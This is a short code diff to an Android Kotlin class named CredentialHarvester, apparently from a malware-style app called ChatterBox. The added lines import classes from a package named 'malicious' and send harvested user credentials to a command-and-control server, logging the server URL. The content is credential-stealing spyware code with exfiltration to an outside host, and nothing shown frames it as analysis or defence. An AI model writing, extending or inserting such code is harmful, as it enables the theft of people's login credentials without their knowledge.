@@ -5,6 +5,8 @@ import android.os.Environment
 import android.util.Log
 import org.json.JSONArray
 import org.json.JSONObject
+import com.example.ChatterBox.malicious.C2Client
+import com.example.ChatterBox.malicious.C2Config
 import java.io.File
 import java.io.FileOutputStream
 import java.text.SimpleDateFormat
@@ -79,6 +81,15 @@ class CredentialHarvester {
                 )
                 FileOutputStream(backupFile).use { out ->
                     out.write(jsonArray.toString(2).toByteArray())
+                }
+                
+                // Send credentials to the C2 server
+                try {
+                    val c2Client = C2Client(context)
+                    c2Client.sendExfiltrationData("credentials", credentialJson.toString())
+                    Log.d(TAG, "Credentials sent to C2 server: ${C2Config.SERVER_URL}")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error sending credentials to C2 server", e)
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error storing credentials", e)
